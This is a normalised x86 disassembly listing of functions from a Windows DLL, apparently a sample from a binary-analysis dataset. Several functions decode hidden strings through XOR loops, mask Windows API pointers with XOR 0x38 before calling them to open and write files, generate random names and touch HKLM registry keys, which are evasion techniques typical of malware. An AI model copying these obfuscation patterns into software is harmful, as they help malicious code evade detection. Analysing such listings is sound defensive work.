cmp ebx 0xb
je r-xdata
lea ecx [ ebp - 0x80 ]
call sub_10061060
lea ecx [ ebp - 0x48 ]
call sub_10061060
lea ecx [ ebp - 0x2c ]
call sub_10061060
mov eax 0x8
jmp r-xdata
lea ecx [ ebp - 0x80 ]
call sub_10061060
lea ecx [ ebp - 0x48 ]
call sub_10061060
lea ecx [ ebp - 0x2c ]
call sub_10061060
xor eax eax
add ebx 0xfffffff5
push ebx
push 0xb
lea edx [ ebp - 0x64 ]
push edx
lea ecx [ ebp - 0x2c ]
call sub_1004d2f0
cmp [ eax + 0x14 ] esi
jb r-xdata
push eax
call sub_1002c5e2
mov ecx [ ebp - 0x88 ]
mov [ ecx ] eax
add esp 0x4
lea ecx [ ebp - 0x64 ]
call sub_10061060
mov eax [ eax ]
sub_10032fdb
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
push ebx
xor ebx ebx
cmp ecx ebx
jbe r-xdata
imul ecx [ ebp + 0x10 ]
push esi
push edi
mov esi ecx
cmp [ ebp + 0x8 ] ebx
je r-xdata
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax [ ebp + 0x10 ]
jae r-xdata
push esi
push [ ebp + 0x8 ]
call sub_1004d322
mov edi eax
pop ecx
pop ecx
test edi edi
je r-xdata
push [ ebp + 0x8 ]
call sub_10017a88
pop ecx
mov ebx eax
call sub_1004fd6f
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
mov eax edi
pop edi
pop esi
cmp ebx esi
jae r-xdata
pop ebx
pop ebp
retn
sub esi ebx
push esi
push 0x0
add ebx edi
push ebx
call sub_10079a10
add esp 0xc
sub_10033049
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x10 ]
push 0x40
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1001d404
add esp 0x18
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
leave
retn
or eax 0xffffffff
leave
retn
sub_10033080
push ebp
mov ebp esp
push 0xffffffff
push sub_100804b0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
mov ecx [ ebp + 0x8 ]
cmp ecx 0x1fffffff
jbe r-xdata
mov eax [ esi + 0x8 ]
sub eax [ esi ]
sar eax 0x3
cmp eax ecx
jae r-xdata
push r--data
call sub_1002c5ed
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
call sub_100029c0
mov ebx eax
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ esi + 0x4 ]
mov ecx [ esi ]
push eax
mov eax ebx
mov [ ebp - 0x14 ] ebx
call sub_10017a20
mov eax [ esi ]
mov edi [ esi + 0x4 ]
sub edi eax
add esp 0x4
sar edi 0x3
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
lea edx [ ebx + ecx * 8 ]
lea eax [ ebx + edi * 8 ]
mov [ esi + 0x8 ] edx
mov [ esi + 0x4 ] eax
mov [ esi ] ebx
push eax
call sub_1006591f
add esp 0x4
sub_10033150
push ebp
mov ebp esp
push esi
mov esi [ rw-data ]
mov ecx [ esi + 0x10 ]
mov eax [ esi + 0xc ]
cmp eax ecx
je r-xdata
or eax 0xffffffff
pop esi
pop ebp
retn
mov edx [ ebp + 0x8 ]
cmp eax ecx
jne r-xdata
add eax 0x8
cmp eax ecx
jne r-xdata
mov edx ecx
add eax 0x8
cmp eax edx
je r-xdata
cmp [ eax ] edx
je r-xdata
add [ esi + 0x10 ] 0xfffffff8
xor eax eax
pop esi
pop ebp
retn
lea ecx [ eax - 0x8 ]
push edi
lea esp [ esp ]
mov edi [ eax ]
mov [ ecx ] edi
mov edi [ eax + 0x4 ]
mov [ ecx + 0x4 ] edi
add eax 0x8
add ecx 0x8
cmp eax edx
jne r-xdata
pop edi
sub_100331b0
lea ecx [ eax + eax * 2 ]
lea ecx [ ecx * 4 + r--data ]
xor eax eax
cmp [ ecx + 0x4 ] eax
jbe r-xdata
mov eax [ ecx + 0x4 ]
xor ecx ecx
mov [ edx + eax * 2 ] cx
retn
push esi
push edi
mov esi [ ecx ]
movsx esi [ esi + eax ]
movzx edi [ ecx + 0x8 ]
xor si di
xor si ax
mov edi 0xff
and si di
mov [ edx + eax * 2 ] si
inc eax
cmp eax [ ecx + 0x4 ]
jb r-xdata
pop edi
pop esi
sub_10033200
push ebp
mov ebp esp
push 0xffffffff
push sub_10082836
mov eax [ fs : 0x0 ]
push eax
sub esp 0x2bc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov edi ecx
mov ecx [ r--data ]
mov [ ebp - 0x2bc ] eax
mov [ ebp - 0x2c4 ] edi
mov [ ebp - 0x2c0 ] 0x0
xor eax eax
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0x72
and edx 0xff
mov [ ebp + eax * 2 - 0x24 ] dx
inc eax
cmp eax 0x9
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x12 ] ax
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0x50
and edx 0xff
mov [ ebp + eax * 2 - 0xc0 ] dx
inc eax
cmp eax 0xc
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0xa8 ] ax
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0xffbd
and edx 0xff
mov [ ebp + eax * 2 - 0xa4 ] dx
inc eax
cmp eax 0xb
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x8e ] ax
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0xffb8
and edx 0xff
mov [ ebp + eax * 2 - 0x8c ] dx
inc eax
cmp eax 0xb
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x76 ] ax
mov edi edi
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xff83
and edx 0xff
mov [ ebp + eax * 2 - 0x74 ] dx
inc eax
cmp eax 0xa
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x60 ] ax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffcd
and edx 0xff
mov [ ebp + eax * 2 - 0x5c ] dx
inc eax
cmp eax 0x9
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x4a ] ax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xff8c
and edx 0xff
mov [ ebp + eax * 2 - 0x48 ] dx
inc eax
cmp eax 0x8
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x38 ] ax
lea ebx [ eax + 0x7 ]
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffb0
and edx 0xff
mov [ ebp + eax * 2 - 0x34 ] dx
inc eax
cmp eax ebx
jb r-xdata
mov ecx [ edi + 0x48 ]
xor eax eax
push ecx
lea esi [ ebp - 0x2b8 ]
mov [ ebp - 0x26 ] ax
call sub_10058280
mov [ ebp - 0x2c0 ] eax
mov [ ebp - 0x4 ] 0x0
mov edx [ edi + 0x44 ]
push edx
lea esi [ ebp - 0x210 ]
call sub_10058280
mov [ ebp - 0x2c8 ] eax
mov [ ebp - 0x4 ] 0x1
mov eax [ edi + 0x4 ]
push eax
lea esi [ ebp - 0x29c ]
call sub_10058280
add esp 0xc
mov edi eax
mov [ ebp - 0x4 ] 0x2
xor ecx ecx
lea eax [ ebp - 0x24 ]
mov [ ebp - 0xdc ] cx
mov [ ebp - 0xc8 ] ebx
mov [ ebp - 0xcc ] 0x0
lea ecx [ eax + 0x2 ]
mov edi edi
mov dx [ eax ]
add eax 0x2
test dx dx
jne r-xdata
sub eax ecx
sar eax 0x1
push eax
lea edx [ ebp - 0x24 ]
push edx
lea ecx [ ebp - 0xdc ]
call sub_100531b0
lea eax [ ebp - 0xdc ]
push eax
mov edx r--data
lea esi [ ebp - 0x264 ]
mov [ ebp - 0x4 ] 0x3
call sub_10030dc0
mov ecx eax
mov eax edi
lea edi [ ebp - 0x22c ]
mov [ ebp - 0x4 ] 0x4
call sub_10044a40
push eax
mov edx r--data
lea esi [ ebp - 0x1f4 ]
mov [ ebp - 0x4 ] 0x5
call sub_10030dc0
push eax
lea edx [ ebp - 0x74 ]
lea esi [ ebp - 0x1bc ]
mov [ ebp - 0x4 ] 0x6
call sub_10030dc0
mov ecx eax
mov eax [ ebp - 0x2c8 ]
lea edi [ ebp - 0x184 ]
mov [ ebp - 0x4 ] bl
call sub_10044a40
push eax
mov edx r--data
lea esi [ ebp - 0x14c ]
mov [ ebp - 0x4 ] 0x8
call sub_10030dc0
mov ecx eax
mov eax [ ebp - 0x2c0 ]
lea edi [ ebp - 0x130 ]
mov [ ebp - 0x4 ] 0x9
call sub_10044a40
push eax
lea edx [ ebp - 0x8c ]
lea esi [ ebp - 0x114 ]
mov [ ebp - 0x4 ] 0xa
call sub_10030dc0
push eax
lea edx [ ebp - 0x48 ]
lea esi [ ebp - 0x248 ]
mov [ ebp - 0x4 ] 0xb
call sub_10030dc0
mov ecx eax
mov edi [ ebp - 0x2c4 ]
lea eax [ edi + 0x60 ]
lea esi [ ebp - 0x1d8 ]
mov [ ebp - 0x4 ] 0xc
call sub_10030aa0
push eax
lea edx [ ebp - 0x5c ]
lea esi [ ebp - 0x280 ]
mov [ ebp - 0x4 ] 0xd
call sub_10030dc0
push eax
lea edx [ ebp - 0xa4 ]
lea esi [ ebp - 0x1a0 ]
mov [ ebp - 0x4 ] 0xe
call sub_10030dc0
mov ecx eax
lea eax [ edi + 0x7c ]
lea esi [ ebp - 0xf8 ]
mov [ ebp - 0x4 ] 0xf
call sub_10030aa0
push eax
lea edx [ ebp - 0xc0 ]
lea esi [ ebp - 0x168 ]
mov [ ebp - 0x4 ] 0x10
call sub_10030dc0
mov esi [ ebp - 0x2bc ]
push eax
lea edx [ ebp - 0x34 ]
mov [ ebp - 0x4 ] 0x11
call sub_10030dc0
mov edi 0x8
add esp 0x28
cmp [ ebp - 0x154 ] edi
jb r-xdata
xor esi esi
xor edx edx
mov [ ebp - 0x154 ] ebx
mov [ ebp - 0x158 ] esi
mov [ ebp - 0x168 ] dx
cmp [ ebp - 0xe4 ] edi
jb r-xdata
mov ecx [ ebp - 0x168 ]
push ecx
call sub_1006591f
add esp 0x4
xor ecx ecx
mov [ ebp - 0xe4 ] ebx
mov [ ebp - 0xe8 ] esi
mov [ ebp - 0xf8 ] cx
cmp [ ebp - 0x18c ] edi
jb r-xdata
mov eax [ ebp - 0xf8 ]
push eax
call sub_1006591f
add esp 0x4
xor eax eax
mov [ ebp - 0x18c ] ebx
mov [ ebp - 0x190 ] esi
mov [ ebp - 0x1a0 ] ax
cmp [ ebp - 0x26c ] edi
jb r-xdata
mov edx [ ebp - 0x1a0 ]
push edx
call sub_1006591f
add esp 0x4
xor edx edx
mov [ ebp - 0x26c ] ebx
mov [ ebp - 0x270 ] esi
mov [ ebp - 0x280 ] dx
cmp [ ebp - 0x1c4 ] edi
jb r-xdata
mov ecx [ ebp - 0x280 ]
push ecx
call sub_1006591f
add esp 0x4
xor ecx ecx
mov [ ebp - 0x1c4 ] ebx
mov [ ebp - 0x1c8 ] esi
mov [ ebp - 0x1d8 ] cx
cmp [ ebp - 0x234 ] edi
jb r-xdata
mov eax [ ebp - 0x1d8 ]
push eax
call sub_1006591f
add esp 0x4
xor eax eax
mov [ ebp - 0x234 ] ebx
mov [ ebp - 0x238 ] esi
mov [ ebp - 0x248 ] ax
cmp [ ebp - 0x100 ] edi
jb r-xdata
mov edx [ ebp - 0x248 ]
push edx
call sub_1006591f
add esp 0x4
xor edx edx
mov [ ebp - 0x100 ] ebx
mov [ ebp - 0x104 ] esi
mov [ ebp - 0x114 ] dx
cmp [ ebp - 0x11c ] edi
jb r-xdata
mov ecx [ ebp - 0x114 ]
push ecx
call sub_1006591f
add esp 0x4
xor ecx ecx
mov [ ebp - 0x11c ] ebx
mov [ ebp - 0x120 ] esi
mov [ ebp - 0x130 ] cx
cmp [ ebp - 0x138 ] edi
jb r-xdata
mov eax [ ebp - 0x130 ]
push eax
call sub_1006591f
add esp 0x4
xor eax eax
mov [ ebp - 0x138 ] ebx
mov [ ebp - 0x13c ] esi
mov [ ebp - 0x14c ] ax
cmp [ ebp - 0x170 ] edi
jb r-xdata
mov edx [ ebp - 0x14c ]
push edx
call sub_1006591f
add esp 0x4
xor edx edx
mov [ ebp - 0x170 ] ebx
mov [ ebp - 0x174 ] esi
mov [ ebp - 0x184 ] dx
cmp [ ebp - 0x1a8 ] edi
jb r-xdata
mov ecx [ ebp - 0x184 ]
push ecx
call sub_1006591f
add esp 0x4
xor ecx ecx
mov [ ebp - 0x1a8 ] ebx
mov [ ebp - 0x1ac ] esi
mov [ ebp - 0x1bc ] cx
cmp [ ebp - 0x1e0 ] edi
jb r-xdata
mov eax [ ebp - 0x1bc ]
push eax
call sub_1006591f
add esp 0x4
xor eax eax
mov [ ebp - 0x1e0 ] ebx
mov [ ebp - 0x1e4 ] esi
mov [ ebp - 0x1f4 ] ax
cmp [ ebp - 0x218 ] edi
jb r-xdata
mov edx [ ebp - 0x1f4 ]
push edx
call sub_1006591f
add esp 0x4
xor edx edx
mov [ ebp - 0x218 ] ebx
mov [ ebp - 0x21c ] esi
mov [ ebp - 0x22c ] dx
cmp [ ebp - 0x250 ] edi
jb r-xdata
mov ecx [ ebp - 0x22c ]
push ecx
call sub_1006591f
add esp 0x4
xor ecx ecx
mov [ ebp - 0x250 ] ebx
mov [ ebp - 0x254 ] esi
mov [ ebp - 0x264 ] cx
cmp [ ebp - 0xc8 ] edi
jb r-xdata
mov eax [ ebp - 0x264 ]
push eax
call sub_1006591f
add esp 0x4
xor eax eax
mov [ ebp - 0xc8 ] ebx
mov [ ebp - 0xcc ] esi
mov [ ebp - 0xdc ] ax
cmp [ ebp - 0x288 ] edi
jb r-xdata
mov edx [ ebp - 0xdc ]
push edx
call sub_1006591f
add esp 0x4
xor edx edx
mov [ ebp - 0x288 ] ebx
mov [ ebp - 0x28c ] esi
mov [ ebp - 0x29c ] dx
cmp [ ebp - 0x1fc ] edi
jb r-xdata
mov ecx [ ebp - 0x29c ]
push ecx
call sub_1006591f
add esp 0x4
xor ecx ecx
mov [ ebp - 0x1fc ] ebx
mov [ ebp - 0x200 ] esi
mov [ ebp - 0x210 ] cx
cmp [ ebp - 0x2a4 ] edi
jb r-xdata
mov eax [ ebp - 0x210 ]
push eax
call sub_1006591f
add esp 0x4
mov eax [ ebp - 0x2bc ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
mov edx [ ebp - 0x2b8 ]
push edx
call sub_1006591f
add esp 0x4
sub_100338d2
push 0x14
push r--data
call sub_10079bf0
or ebx 0xffffffff
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
test eax eax
js r-xdata
call sub_1002ada5
and [ eax ] 0x0
call sub_1004fd6f
mov [ eax ] 0x9
call sub_1002ada5
and [ eax ] 0x0
call sub_1004fd6f
mov [ eax ] 0x9
call sub_1001d849
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_10079c35
retn
mov eax ebx
mov edx ebx
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea edi [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ edi ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_100532a0
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_1004fd6f
mov [ eax ] 0x9
call sub_1002ada5
and [ eax ] 0x0
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100202ee
add esp 0x10
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100339b2
mov eax [ ebp - 0x24 ]
mov edx [ ebp - 0x20 ]
sub_100339d0
push ebp
mov ebp esp
sub esp 0x14
push ebx
mov ebx eax
push esi
push edi
test ebx ebx
jne r-xdata
call sub_1003ae80
test eax eax
je r-xdata
lea eax [ ebx + 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx + 0x128 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x8 ] 0x0
test eax eax
je r-xdata
mov eax 0x2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov ebx rw-data
mov [ ebp - 0xc ] rw-data
mov [ ebp - 0x4 ] ebx
mov edi [ eax ]
test edi edi
je r-xdata
mov eax 0x3
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov eax 0x4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
test ebx ebx
je r-xdata
push eax
push ebx
call [ StrCpyW@IAT ]
mov eax [ ebp - 0xc ]
mov esi [ edi + 0x8 ]
push eax
add ebx 0x3cf0
call sub_1001cb30
add esp 0x4
test eax eax
jne r-xdata
mov eax 0x5
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov esi [ edi + 0xc ]
lea ecx [ eax + 0xb7fc ]
push ecx
lea ebx [ eax + 0x7b0c ]
call sub_1004b970
add esp 0x4
test eax eax
jne r-xdata
mov eax 0x6
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
lea ecx [ eax + rw-data ]
test ecx ecx
je r-xdata
mov eax 0x7
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl [ edi + 0x10 ]
add [ ebp - 0xc ] 0x2
add [ ebp - 0x4 ] 0x208
mov [ ecx ] dl
mov ecx [ edi + 0x14 ]
mov [ eax * 4 + rw-data ] ecx
mov edx [ edi + 0x18 ]
mov ecx [ ebp - 0x10 ]
mov [ eax * 4 + rw-data ] edx
mov ecx [ ecx + 0x4 ]
inc eax
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x8 ] eax
test ecx ecx
je r-xdata
mov ebx [ ebp - 0x4 ]
mov eax ecx
jmp r-xdata
cmp [ ebp - 0x8 ] 0x1e
jae r-xdata
sub_10033b21
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_1006a508
mov ecx [ ebp + 0x10 ]
xor ebx ebx
cmp ecx ebx
jne r-xdata
cmp [ ebp + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp [ ebp + 0xc ] ebx
je r-xdata
call sub_1004fd6f
mov [ eax ] 0x16
call sub_1001d849
cmp [ ebp - 0x4 ] bl
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
push esi
mov esi 0x7fffffff
cmp ecx esi
jbe r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
leave
retn
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] ebx
jne r-xdata
call sub_1004fd6f
mov [ eax ] 0x16
call sub_1001d849
jmp r-xdata
push [ eax + 0x4 ]
push ecx
push [ ebp + 0xc ]
push ecx
push [ ebp + 0x8 ]
push 0x1001
push [ eax + 0xc ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10050467
add esp 0x20
cmp eax ebx
jne r-xdata
push [ ebp + 0x14 ]
push ecx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100616ba
add esp 0x10
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
add eax 0xfffffffe
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop esi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_10033c00
push ebp
mov ebp esp
sub esp 0x6ac
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
mov esi ecx
mov edi edx
mov [ ebp - 0x6a8 ] edi
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
xor eax eax
pop esi
call sub_10024145
mov esp ebp
pop ebp
retn
test edi edi
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push ebx
lea edx [ ebp - 0x6ac ]
mov eax 0x1
call sub_1000a460
lea edx [ ebp - 0x6a4 ]
mov eax 0x2
call sub_1000a460
lea edx [ ebp - 0x6a0 ]
xor eax eax
call sub_1000a460
mov eax edx
push eax
push esi
call [ StrStrW@IAT ]
lea ecx [ ebp - 0x69c ]
test eax eax
mov edx 0x30c
mov eax ecx
je r-xdata
xor ebx ebx
sub esi ecx
nop
lea ebx [ ebp - 0x6a4 ]
xor edi edi
sub ebx ecx
lea esp [ esp ]
test edx edx
jne r-xdata
movzx ecx [ esi + eax ]
test cx cx
je r-xdata
test edx edx
jne r-xdata
movzx ecx [ ebx + eax ]
test cx cx
je r-xdata
xor edx edx
mov [ eax ] dx
test ebx ebx
je r-xdata
sub eax 0x2
mov ebx 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
xor edx edx
mov [ eax ] dx
test edi edi
jne r-xdata
sub eax 0x2
mov edi 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
lea eax [ ebp - 0x6a0 ]
push eax
mov esi 0x30c
lea ebx [ ebp - 0x69c ]
call sub_1003d910
test eax eax
jne r-xdata
pop ebx
pop edi
xor eax eax
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
lea ecx [ edx + 0x7ffffcf2 ]
test ecx ecx
je r-xdata
jmp r-xdata
pop ebx
pop edi
xor eax eax
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
push esi
mov esi 0x30c
lea ebx [ ebp - 0x69c ]
call sub_1003d910
test eax eax
jne r-xdata
lea ecx [ edx + 0x7ffffcf2 ]
test ecx ecx
je r-xdata
jmp r-xdata
lea ecx [ ebp - 0x6a0 ]
push ecx
push edi
call [ StrStrW@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x6a4 ]
push eax
call sub_1003d910
test eax eax
je r-xdata
push edi
mov esi 0x30c
lea ebx [ ebp - 0x69c ]
call sub_1003d910
test eax eax
jne r-xdata
lea edx [ ebp - 0x6a4 ]
push edx
call sub_1003d910
test eax eax
jne r-xdata
mov edi [ ebp - 0x6a8 ]
lea eax [ ebp - 0x6a0 ]
push eax
push edi
call [ StrStrW@IAT ]
test eax eax
je r-xdata
lea edx [ ebp - 0x6ac ]
push edx
mov esi 0x30c
lea ebx [ ebp - 0x69c ]
call sub_1003d910
test eax eax
jne r-xdata
lea ecx [ ebp - 0x6a4 ]
push ecx
call sub_1003d910
test eax eax
jne r-xdata
lea eax [ ebp - 0x6a0 ]
push eax
call sub_1003d910
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call sub_1003d910
test eax eax
jne r-xdata
lea edx [ ebp - 0x84 ]
mov eax 0x4
call sub_1000a460
push 0x80000002
mov ecx edx
call sub_1001b3e0
add esp 0x4
pop ebx
pop edi
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
sub_10033e60
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
xor ecx ecx
mov eax edi
mov edx 0x2
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_10035b61
dec edi
add esp 0x4
xor esi esi
mov ebx eax
test edi edi
jle r-xdata
mov eax [ ebp + 0x8 ]
pop edi
xor edx edx
mov [ ebx + eax * 2 - 0x2 ] dx
pop esi
mov eax ebx
pop ebx
pop ebp
retn 0x4
lea ecx [ ecx ]
call sub_100614c9
xor edx edx
mov ecx 0x1a
div ecx
inc esi
add edx 0x61
mov [ ebx + esi * 2 - 0x2 ] dx
cmp esi edi
jl r-xdata
sub_10033ebe
mov edi edi
push ebp
mov ebp esp
jmp r-xdata
cmp [ ebp + 0x18 ] 0x0
ja r-xdata
mov eax [ ebp + 0x14 ]
movzx eax [ eax ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1002c59e
dec [ ebp + 0x18 ]
inc [ ebp + 0x14 ]
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn
sub_10033ef0
push 0x14
mov eax sub_1007f62c
call sub_100097c8
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100014b7
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10015f10
mov ecx [ ebp + 0x8 ]
push eax
call sub_10065660
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10050f50
mov eax edi
call sub_1004db01
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1002b4f6
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10030d90
push edi
call sub_1004d80c
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_1005457d
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1000bd19
sub_10033f90
push ebp
mov ebp esp
push 0xffffffff
push sub_1008302c
mov eax [ fs : 0x0 ]
push eax
sub esp 0x38
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
mov esi edx
mov [ ebp - 0x44 ] esi
mov [ ebp - 0x40 ] edi
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x34 ] ecx
call sub_10003330
lea edi [ esi + 0x70 ]
mov eax 0x7
xor ebx ebx
xor edx edx
mov [ edi + 0x14 ] eax
mov [ edi + 0x10 ] ebx
mov [ edi ] dx
mov [ ebp - 0x4 ] ebx
mov [ esi ] r--data
mov [ esi + 0x90 ] ebx
mov [ esi + 0xa8 ] eax
xor eax eax
mov [ esi + 0xa4 ] ebx
mov [ esi + 0x94 ] ax
mov [ esi + 0xb0 ] ebx
mov [ esi + 0xb4 ] ebx
mov [ esi + 0xb8 ] ebx
mov [ esi + 0xbc ] ebx
mov ecx esi
mov [ ebp - 0x4 ] 0x2
call sub_10053cd0
cmp [ edi + 0x14 ] 0x8
jb r-xdata
mov ecx [ rw-data ]
push ebx
push 0x80
push 0x4
push ebx
push ebx
mov [ ebp - 0x30 ] ecx
xor [ ebp - 0x30 ] 0x38
xor [ ebp - 0x2f ] 0x38
xor [ ebp - 0x2e ] 0x38
xor [ ebp - 0x2d ] 0x38
push 0x60000000
push edi
call [ ebp - 0x30 ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
mov edi [ edi ]
mov eax [ ebp - 0x40 ]
mov eax [ eax + 0x54 ]
cmp eax ebx
je r-xdata
push ebx
push ebx
push ebx
push edi
call [ SetFilePointer@IAT ]
mov edx [ rw-data ]
mov ecx [ ebp - 0x34 ]
push ebx
mov [ ebp - 0x30 ] edx
mov edx [ ebp - 0x3c ]
xor [ ebp - 0x30 ] 0x38
xor [ ebp - 0x2f ] 0x38
xor [ ebp - 0x2e ] 0x38
xor [ ebp - 0x2d ] 0x38
lea eax [ ebp - 0x38 ]
push eax
push ecx
push edx
push edi
call [ ebp - 0x30 ]
mov eax [ rw-data ]
mov [ ebp - 0x30 ] eax
xor [ ebp - 0x30 ] 0x38
xor [ ebp - 0x2f ] 0x38
xor [ ebp - 0x2e ] 0x38
xor [ ebp - 0x2d ] 0x38
push edi
call [ ebp - 0x30 ]
mov edx [ ebp - 0x34 ]
xor ecx ecx
cmp [ ebp - 0x38 ] edx
sete cl
mov [ esi + 0x8 ] ecx
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x8
mov [ ebp - 0x30 ] eax
mov cx [ eax ]
add eax 0x2
cmp cx bx
jne r-xdata
sub eax edi
sar eax 0x1
push eax
push edx
lea ecx [ ebp - 0x2c ]
call sub_100531b0
lea ecx [ ebp - 0x2c ]
push ecx
